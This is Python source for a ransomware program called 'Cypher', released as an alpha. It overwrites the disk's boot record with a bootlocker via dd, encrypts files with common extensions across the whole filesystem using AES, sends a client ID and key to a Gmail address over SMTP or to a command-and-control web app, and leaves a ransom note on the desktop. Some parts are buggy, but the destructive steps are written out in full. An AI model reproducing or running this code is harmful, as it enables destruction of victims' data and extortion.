#!/usr/bin/env python2.7

# Cypher is a work in progress, as such this is an Alpha release of the encryption
# module, for reporting bugs feel free to open an issue or should you wish to 
# collaborate on this, pull requests are welcomed as well.

import os
import sys
import random
import struct
import smtplib
import string
import datetime
import mechanize

import getpass as gp

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from multiprocessing import Pool

# Function to generate our client ID
def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

# Set `SMTP` to False in order to force the program to use HTTP and it's own C&C Web App. 
SMTP = True
ID = gen_client_ID(12)

# Check to see if we're on linux and have root, if so use dd to overwrite the MBR with our bootlocker.
if sys.platform == 'linux2' and gp.getuser() == 'root':
	try:
		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
	except:
		pass	
else:			
	try:
		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
	except:
		pass

def Key_Ops_HTTP():
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders = [('user-agent', '  Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3'),
	('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]

	try:
		br.open("http://127.0.0.1:8000/admin/login/?next=/admin/")
	except Exception as e:
		# print "[!]Critical, could not open page."
		# print "\n %s" % (e)
		pass
		
	br.form = list(br.forms())[0]
	br["username"] = "RansomBot"
	br["password"] = "prettyflypassw0rd"

	br.submit()
	# If log in was succesful retrieve key and post ID
	###---@---###
	

def send_Key_SMTP():
	ts = datetime.datetime.now()
	SERVER = "smtp.gmail.com" 		
	PORT = 587 						
	USER= "address@gmail.com"		# Specify Username Here 
	PASS= "prettyflypassword"	    # Specify Password Here
	FROM = USER
	TO = ["address@gmail.com"] 		
	SUBJECT = "Ransomware data: "+str(ts)
	MESSAGE = """\Client ID: %s Decryption Key: %s """ % (ID, exKey)
	message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
	try:              
		server = smtplib.SMTP()
		server.connect(SERVER, PORT)
		server.starttls()
		server.login(USER, PASS)
		server.sendmail(FROM, TO, message)
		server.quit()
	except Exception as e:
		# print e
		pass



def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + '.crypt'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
				
				

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def select_files():
    
    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
           ".mov", ".gif", ".txt", ".py", ".pyc", ".jar"]
           
    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(tuple(ext)):
                files_to_enc.append(os.path.join(root, file))

    # Parallelize execution of encryption function over four subprocesses
    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc)
				

def note():
	
	readme = """
	
	.d8888b.                    888                       
	d88P  Y88b                   888                       
	888    888                   888                       
	888        888  888 88888b.  88888b.   .d88b.  888d888 
	888        888  888 888 "88b 888 "88b d8P  Y8b 888P"   
	888    888 888  888 888  888 888  888 88888888 888     
	Y88b  d88P Y88b 888 888 d88P 888  888 Y8b.     888     
	"Y8888P"   "Y88888 88888P"  888  888  "Y8888  888     
        	        888 888                                
        	 Y8b d88P 888                                
        	 "Y88P"  888     
	
	
	
	Hello, unfortunately all your personal files have been encrypted with millitary grade encryption and will be impossible
	to retrieve without aquiring the encryption key and decrypting binary. 
	As of yet these are not available to you since the Cypher ransomware is still under construction. 
	We thank you for your patience.

	Have a nice day,

	The Cypher Project.""" 	
	
	# Windows variant
	# outdir = os.getenv('USERNAME') + "\\Desktop"
	
	outdir = os.getenv('HOME') + "/Desktop/"
	outfile = outdir + "README"
	
	handler = open(outfile, 'w')
	handler.write(readme, ID)
	handler.close()
	
if __name__=="__main__":
	if SMTP == True:
		key = RSA.generate(2048)
		exKey = RSA.exportKey('PEM')
		send_Key_SMTP()
	else:
		Key_Ops_HTTP()
		
	select_files()
		
	try:	
		note()
	except Exception as e:
		# print e
		pass
